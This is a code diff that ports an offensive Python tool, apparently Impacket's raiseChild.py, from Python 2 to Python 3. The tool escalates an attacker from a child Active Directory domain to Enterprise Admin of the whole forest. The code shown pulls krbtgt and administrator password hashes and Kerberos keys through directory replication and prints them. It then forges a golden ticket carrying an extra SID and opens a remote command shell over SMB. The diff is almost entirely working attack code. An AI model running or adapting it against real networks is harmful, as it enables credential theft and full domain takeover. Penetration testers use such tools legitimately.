@@ -49,7 +49,8 @@
 #     In addition, each domain has its own individual security policies and trust relationships with other domains.
 #
 #
-
+from __future__ import division
+from __future__ import print_function
 import argparse
 import datetime
 import logging
@@ -63,6 +64,7 @@ from threading import Thread, Lock
 from binascii import unhexlify, hexlify
 from socket import gethostbyname
 from struct import unpack
+from six import PY3
 
 try:
     import pyasn1
@@ -139,7 +141,7 @@ class PSEXEC:
         dce = rpctransport.get_dce_rpc()
         try:
             dce.connect()
-        except Exception, e:
+        except Exception as e:
             logging.critical(str(e))
             sys.exit(1)
 
@@ -157,7 +159,7 @@ class PSEXEC:
             else:
                 try:
                     f = open(self.__exeFile)
-                except Exception, e:
+                except Exception as e:
                     logging.critical(str(e))
                     sys.exit(1)
                 installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
@@ -174,18 +176,18 @@ class PSEXEC:
                 self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command
 
             tid = s.connectTree('IPC$')
-            fid_main = self.openPipe(s,tid,'\RemCom_communicaton',0x12019f)
+            fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
 
             packet = RemComMessage()
             pid = os.getpid()
 
-            packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
+            packet['Machine'] = ''.join([random.choice(string.ascii_letters) for _ in range(4)])
             if self.__path is not None:
                 packet['WorkingDir'] = self.__path
             packet['Command'] = self.__command
             packet['ProcessID'] = pid
 
-            s.writeNamedPipe(tid, fid_main, str(packet))
+            s.writeNamedPipe(tid, fid_main, packet.getData())
 
             # Here we'll store the command we type so we don't print it back ;)
             # ( I know.. globals are nasty :P )
@@ -194,16 +196,16 @@ class PSEXEC:
 
             # Create the pipes threads
             stdin_pipe = RemoteStdInPipe(rpctransport,
-                                         '\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                                         r'\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
                                          smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
                                          installService.getShare())
             stdin_pipe.start()
             stdout_pipe = RemoteStdOutPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                                           r'\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stdout_pipe.start()
             stderr_pipe = RemoteStdErrPipe(rpctransport,
-                                           '\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                                           r'\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
                                            smb.FILE_READ_DATA)
             stderr_pipe.start()
             
@@ -280,7 +282,7 @@ class Pipes(Thread):
             self.server.waitNamedPipe(self.tid, self.pipe)
             self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
             self.server.setTimeout(1000000)
-        except Exception, e:
+        except Exception:
             logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)
 
 class RemoteStdOutPipe(Pipes):
@@ -298,7 +300,7 @@ class RemoteStdOutPipe(Pipes):
                 try:
                     global LastDataSent
                     if ans != LastDataSent:
-                        sys.stdout.write(ans)
+                        sys.stdout.write(ans.decode('cp437'))
                         sys.stdout.flush()
                     else:
                         # Don't echo what I sent, and clear it up
@@ -349,13 +351,13 @@ class RemoteShell(cmd.Cmd):
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
     def do_help(self, line):
-        print """
+        print("""
  lcd {path}                 - changes the current local directory to {path}
  exit                       - terminates the server process (and this session)
  put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
  get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
  ! {cmd}                    - executes a local shell cmd
-""" % (self.share, self.share)
+""" % (self.share, self.share))
         self.send_data('\r\n', False)
 
     def do_shell(self, s):
@@ -370,10 +372,10 @@ class RemoteShell(cmd.Cmd):
             import ntpath
             filename = ntpath.basename(src_path)
             fh = open(filename,'wb')
-            logging.info("Downloading %s\%s" % (self.share, src_path))
+            logging.info("Downloading %s\\%s" % (self.share, src_path))
             self.transferClient.getFile(self.share, src_path, fh.write)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -394,11 +396,14 @@ class RemoteShell(cmd.Cmd):
             src_file = os.path.basename(src_path)
             fh = open(src_path, 'rb')
             f = dst_path + '/' + src_file
-            pathname = string.replace(f,'/','\\')
-            logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
-            self.transferClient.putFile(self.share, pathname, fh.read)
+            pathname = f.replace('/','\\')
+            logging.info("Uploading %s to %s\\%s" % (src_file, self.share, dst_path))
+            if PY3:
+                self.transferClient.putFile(self.share, pathname, fh.read)
+            else:
+                self.transferClient.putFile(self.share, pathname.decode(sys.stdin.encoding), fh.read)
             fh.close()
-        except Exception, e:
+        except Exception as e:
             logging.error(str(e))
             pass
 
@@ -407,11 +412,11 @@ class RemoteShell(cmd.Cmd):
 
     def do_lcd(self, s):
         if s == '':
-            print os.getcwd()
+            print(os.getcwd())
         else:
             try:
                 os.chdir(s)
-            except Exception, e:
+            except Exception as e:
                 logging.error(str(e))
         self.send_data('\r\n')
 
@@ -420,7 +425,10 @@ class RemoteShell(cmd.Cmd):
         return
 
     def default(self, line):
-        self.send_data(line+'\r\n')
+        if PY3:
+            self.send_data(line.encode('cp437')+b'\r\n')
+        else:
+            self.send_data(line.decode(sys.stdin.encoding).encode('cp437')+'\r\n')
 
     def send_data(self, data, hideOutput = True):
         if hideOutput is True:
@@ -538,7 +546,7 @@ class RAISECHILD:
         s = SMBConnection(machineIP, machineIP)
         try:
             s.login('','')
-        except Exception, e:
+        except Exception:
             logging.debug('Error while anonymous logging into %s' % machineIP)
         else:
             s.logoff()
@@ -549,7 +557,7 @@ class RAISECHILD:
         s = SMBConnection(machineIP, machineIP)
         try:
             s.login('','')
-        except Exception, e:
+        except Exception:
             logging.debug('Error while anonymous logging into %s' % machineIP)
         else:
             s.logoff()
@@ -630,8 +638,8 @@ class RAISECHILD:
         drs['dwFlagsExt'] = 0
         drs['ConfigObjGUID'] = drsuapi.NULLGUID
         drs['dwExtCaps'] = 127
-        request['pextClient']['cb'] = len(drs)
-        request['pextClient']['rgb'] = list(str(drs))
+        request['pextClient']['cb'] = len(drs.getData())
+        request['pextClient']['rgb'] = list(drs.getData())
         resp = self.__drsr.request(request)
 
         # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
@@ -639,7 +647,7 @@ class RAISECHILD:
         drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()
 
         # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
-        ppextServer = ''.join(resp['ppextServer']['rgb']) + '\x00' * (
+        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
         len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
         drsExtensionsInt.fromString(ppextServer)
 
@@ -650,7 +658,7 @@ class RAISECHILD:
                     'dwReplEpoch'])
             drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
             request['pextClient']['cb'] = len(drs)
-            request['pextClient']['rgb'] = list(str(drs))
+            request['pextClient']['rgb'] = list(drs.getData())
             resp = self.__drsr.request(request)
 
         self.__hDrs = resp['phDrs']
@@ -679,7 +687,7 @@ class RAISECHILD:
             try:
                 attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                 LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
-            except Exception, e:
+            except Exception as e:
                 logging.debug('Failed to execute OidFromAttid with error %s' % e)
                 # Fallbacking to fixed table and hope for the best
                 attId = attr['attrTyp']
@@ -687,7 +695,7 @@ class RAISECHILD:
 
             if attId == LOOKUP_TABLE['supplementalCredentials']:
                 if attr['AttrVal']['valCount'] > 0:
-                    blob = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                    blob = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                     plainText = drsuapi.DecryptAttributeValue(self.__drsr, blob)
                     if len(plainText) < 24:
                         plainText = None
@@ -712,7 +720,7 @@ class RAISECHILD:
                         data = data[len(keyDataNew):]
                         keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]
 
-                        if  self.KERBEROS_TYPE.has_key(keyDataNew['KeyType']):
+                        if  keyDataNew['KeyType'] in self.KERBEROS_TYPE:
                             # Give me only the AES256
                             if keyDataNew['KeyType'] == 18:
                                 return hexlify(keyValue)
@@ -728,7 +736,7 @@ class RAISECHILD:
             try:
                 attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                 LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
-            except Exception, e:
+            except Exception as e:
                 logging.debug('Failed to execute OidFromAttid with error %s, fallbacking to fixed table' % e)
                 # Fallbacking to fixed table and hope for the best
                 attId = attr['attrTyp']
@@ -741,13 +749,13 @@ class RAISECHILD:
                     LMHash = LMOWFv1('', '')
             elif attId == LOOKUP_TABLE['unicodePwd']:
                 if attr['AttrVal']['valCount'] > 0:
-                    encryptedUnicodePwd = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                    encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                     encryptedNTHash = drsuapi.DecryptAttributeValue(self.__drsr, encryptedUnicodePwd)
                 else:
                     NTHash = NTOWFv1('', '')
             elif attId == LOOKUP_TABLE['objectSid']:
                 if attr['AttrVal']['valCount'] > 0:
-                    objectSid = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
+                    objectSid = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                     rid = unpack('<L', objectSid[-4:])[0]
                 else:
                     raise Exception('Cannot get objectSid for %s' % record['pmsgOut']['V6']['pNC']['StringName'][:-1])
@@ -795,7 +803,7 @@ class RAISECHILD:
             self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
             self.__ppartialAttrSet['dwVersion'] = 1
             self.__ppartialAttrSet['cAttrs'] = len(self.ATTRTYP_TO_ATTID)
-            for attId in self.ATTRTYP_TO_ATTID.values():
+            for attId in list(self.ATTRTYP_TO_ATTID.values()):
                 self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
         request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
         request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
@@ -825,10 +833,8 @@ class RAISECHILD:
 
             rid, lmhash, nthash = self.__decryptHash(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
             aesKey = self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'])
-        except Exception, e:
-            if logging.getLogger().level == logging.DEBUG:
-                import traceback
-                traceback.print_exc()
+        except Exception as e:
+            logging.debug('Exception:', exc_info=True)
             logging.error("Error while processing user!")
             logging.error(str(e))
             raise
@@ -860,7 +866,7 @@ class RAISECHILD:
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
         # key or application session key), encrypted with the
         # service key (Section 5.3)
-        plainText = cipher.decrypt(key, 2, str(cipherText))
+        plainText = cipher.decrypt(key, 2, cipherText)
         #hexdump(plainText)
 
         encTicketPart = decoder.decode(plainText, asn1Spec = EncTicketPart())[0]
@@ -875,7 +881,7 @@ class RAISECHILD:
         #print adIfRelevant.prettyPrint()
 
         # So here we have the PAC
-        pacType = PACTYPE(str(adIfRelevant[0]['ad-data']))
+        pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
         buffers = pacType['Buffers']
         pacInfos = {}
 
@@ -886,7 +892,7 @@ class RAISECHILD:
             buffers = buffers[len(infoBuffer):]
 
         # Let's locate the KERB_VALIDATION_INFO and Checksums
-        if pacInfos.has_key(PAC_LOGON_INFO):
+        if PAC_LOGON_INFO in pacInfos:
             data = pacInfos[PAC_LOGON_INFO]
             validationInfo = VALIDATION_INFO()
             validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
@@ -931,7 +937,7 @@ class RAISECHILD:
             validationInfo['Data']['ExtraSids'].append(sidRecord)
 
             validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
-            validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))
+            validationInfoAlignment = b'\x00' * (((len(validationInfoBlob) + 7) // 8 * 8) - len(validationInfoBlob))
 
             if logging.getLogger().level == logging.DEBUG:
                 logging.debug('VALIDATION_INFO after making it gold')
@@ -941,61 +947,61 @@ class RAISECHILD:
             raise Exception('PAC_LOGON_INFO not found! Aborting')
 
         # Let's now clear the checksums
-        if pacInfos.has_key(PAC_SERVER_CHECKSUM):
+        if PAC_SERVER_CHECKSUM in pacInfos:
             serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
             if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                serverChecksum['Signature'] = '\x00'*12
+                serverChecksum['Signature'] = b'\x00'*12
             else:
-                serverChecksum['Signature'] = '\x00'*16
+                serverChecksum['Signature'] = b'\x00'*16
         else:
             raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_PRIVSVR_CHECKSUM):
+        if PAC_PRIVSVR_CHECKSUM in pacInfos:
             privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
-            privSvrChecksum['Signature'] = '\x00'*12
+            privSvrChecksum['Signature'] = b'\x00'*12
             if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
-                privSvrChecksum['Signature'] = '\x00'*12
+                privSvrChecksum['Signature'] = b'\x00'*12
             else:
-                privSvrChecksum['Signature'] = '\x00'*16
+                privSvrChecksum['Signature'] = b'\x00'*16
         else:
             raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')
 
-        if pacInfos.has_key(PAC_CLIENT_INFO_TYPE):
+        if PAC_CLIENT_INFO_TYPE in pacInfos:
             pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
-            pacClientInfoAlignment = '\x00'*(((len(pacClientInfoBlob)+7)/8*8)-len(pacClientInfoBlob))
+            pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
         else:
             raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')
 
 
         # We changed everything we needed to make us special. Now let's repack and calculate checksums
-        serverChecksumBlob = str(serverChecksum)
-        serverChecksumAlignment = '\x00'*(((len(serverChecksumBlob)+7)/8*8)-len(serverChecksumBlob))
+        serverChecksumBlob = serverChecksum.getData()
+        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))
 
-        privSvrChecksumBlob = str(privSvrChecksum)
-        privSvrChecksumAlignment = '\x00'*(((len(privSvrChecksumBlob)+7)/8*8)-len(privSvrChecksumBlob))
+        privSvrChecksumBlob = privSvrChecksum.getData()
+        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))
 
         # The offset are set from the beginning of the PAC_TYPE
         # [MS-PAC] 2.4 PAC_INFO_BUFFER
-        offsetData = 8 + len(str(PAC_INFO_BUFFER()))*4
+        offsetData = 8 + len(PAC_INFO_BUFFER().getData())*4
 
         # Let's build the PAC_INFO_BUFFER for each one of the elements
         validationInfoIB = PAC_INFO_BUFFER()
         validationInfoIB['ulType'] = PAC_LOGON_INFO
         validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
         validationInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+validationInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         pacClientInfoIB = PAC_INFO_BUFFER()
         pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
         pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
         pacClientInfoIB['Offset'] = offsetData
-        offsetData = (offsetData+pacClientInfoIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8
 
         serverChecksumIB = PAC_INFO_BUFFER()
         serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
         serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
         serverChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData+serverChecksumIB['cbBufferSize'] + 7) /8 *8
+        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8
 
         privSvrChecksumIB = PAC_INFO_BUFFER()
         privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
@@ -1004,17 +1010,17 @@ class RAISECHILD:
         #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
-            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
-            pacInfos[PAC_CLIENT_INFO_TYPE]) + pacClientInfoAlignment
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
+            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
+            pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
+        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
 
         pacType = PACTYPE()
         pacType['cBuffers'] = 4
         pacType['Version'] = 0
         pacType['Buffers'] = buffers + buffersTail
 
-        blobToChecksum = str(pacType)
+        blobToChecksum = pacType.getData()
 
         # If you want to do MD5, ucomment this
         checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
@@ -1036,13 +1042,13 @@ class RAISECHILD:
         serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, 17, blobToChecksum)
         privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, 17, serverChecksum['Signature'])
 
-        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
+        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
         pacType['Buffers'] = buffers + buffersTail
 
         authorizationData = AuthorizationData()
         authorizationData[0] = noValue
         authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
-        authorizationData[0]['ad-data'] = str(pacType)
+        authorizationData[0]['ad-data'] = pacType.getData()
         authorizationData = encoder.encode(authorizationData)
 
         encTicketPart['authorization-data'][0]['ad-data'] = authorizationData
@@ -1061,7 +1067,7 @@ class RAISECHILD:
         # AS-REP Ticket and TGS-REP Ticket (includes TGS session
         # key or application session key), encrypted with the
         # service key (Section 5.3)
-        cipherText = cipher.encrypt(key, 2, str(encodedEncTicketPart), None)
+        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)
 
         asRep['ticket']['enc-part']['cipher'] = cipherText
 
@@ -1078,8 +1084,9 @@ class RAISECHILD:
         targetUser = 'krbtgt'
         logging.info('Getting credentials for %s' % childName)
         rid, credentials = self.getCredentials(targetUser, childName, childCreds)
-        print '%s/%s:%s:%s:%s:::' % (childName, targetUser, rid, credentials['lmhash'], credentials['nthash'])
-        print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (childName, targetUser, credentials['aesKey'])
+        print('%s/%s:%s:%s:%s:::' % (
+        childName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
+        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (childName, targetUser, credentials['aesKey'].decode('utf-8')))
 
         # 5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
         userName = Principal(childCreds['username'], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -1090,7 +1097,7 @@ class RAISECHILD:
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'],
                                                                         childCreds['domain'], childCreds['lmhash'],
                                                                         childCreds['nthash'], None, self.__kdcHost)
-            except KerberosError, e:
+            except KerberosError as e:
                 if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                     # We might face this if the target does not support AES (most probably
                     # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -1131,7 +1138,7 @@ class RAISECHILD:
                 TGS['oldSessionKey'] = oldSessionKeyCIFS
                 TGS['sessionKey'] = sessionKeyCIFS
                 break
-            except KerberosError, e:
+            except KerberosError as e:
                 if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                     # We might face this if the target does not support AES (most probably
                     # Windows XP). So, if that's the case we'll force using RC4 by converting
@@ -1151,13 +1158,14 @@ class RAISECHILD:
         targetUser = 'krbtgt'
         childCreds['TGT'] = TGT
         rid, credentials = self.getCredentials(targetUser, parentName, childCreds)
-        print '%s/%s:%s:%s:%s:::' % (parentName, targetUser, rid, credentials['lmhash'], credentials['nthash'])
-        print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'])
+        print('%s/%s:%s:%s:%s:::' % (
+        parentName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
+        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'].decode("utf-8")))
 
         logging.info('Administrator account name is %s' % adminName)
         rid, credentials = self.getCredentials(adminName, parentName, childCreds)
-        print '%s/%s:%s:%s:%s:::' % (parentName, adminName, rid, credentials['lmhash'], credentials['nthash'])
-        print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, adminName, credentials['aesKey'])
+        print('%s/%s:%s:%s:%s:::' % (parentName, adminName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
+        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, adminName, credentials['aesKey'].decode('utf-8')))
 
         adminCreds = {}
         adminCreds['username'] = adminName
@@ -1206,7 +1214,7 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
 
-    print version.BANNER
+    print(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help = True, description = "Privilege Escalation from a child domain up to its "
                                                                     "forest")
@@ -1231,17 +1239,17 @@ if __name__ == '__main__':
 
     if len(sys.argv)==1:
         parser.print_help()
-        print "\nExamples: "
-        print "\tpython raiseChild.py childDomain.net/adminuser\n"
-        print "\tthe password will be asked, or\n"
-        print "\tpython raiseChild.py childDomain.net/adminuser:mypwd\n"
-        print "\tor if you just have the hashes\n"
-        print "\tpython raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser\n"
+        print("\nExamples: ")
+        print("\tpython raiseChild.py childDomain.net/adminuser\n")
+        print("\tthe password will be asked, or\n")
+        print("\tpython raiseChild.py childDomain.net/adminuser:mypwd\n")
+        print("\tor if you just have the hashes\n")
+        print("\tpython raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser\n")
 
-        print "\tThis will perform the attack and then psexec against target-exec as Enterprise Admin"
-        print "\tpython raiseChild.py -target-exec targetHost childDomainn.net/adminuser\n"
-        print "\tThis will save the final goldenTicket generated in the ccache target file"
-        print "\tpython raiseChild.py -w ccache childDomain.net/adminuser\n"
+        print("\tThis will perform the attack and then psexec against target-exec as Enterprise Admin")
+        print("\tpython raiseChild.py -target-exec targetHost childDomainn.net/adminuser\n")
+        print("\tThis will save the final goldenTicket generated in the ccache target file")
+        print("\tpython raiseChild.py -w ccache childDomain.net/adminuser\n")
         sys.exit(1)
  
     options = parser.parse_args()
@@ -1279,12 +1287,10 @@ if __name__ == '__main__':
     try:
         pacifier = RAISECHILD(options.target_exec, username, password, domain, options, commands)
         pacifier.exploit()
-    except SessionError, e:
+    except SessionError as e:
         logging.critical(str(e))
         if e.getErrorCode() == STATUS_NO_LOGON_SERVERS:
             logging.info('Try using Kerberos authentication (-k switch). That might help solving the STATUS_NO_LOGON_SERVERS issue')
-    except Exception, e:
-        if logging.getLogger().level == logging.DEBUG:
-            import traceback
-            traceback.print_exc()
+    except Exception as e:
+        logging.debug('Exception:', exc_info=True)
         logging.critical(str(e))
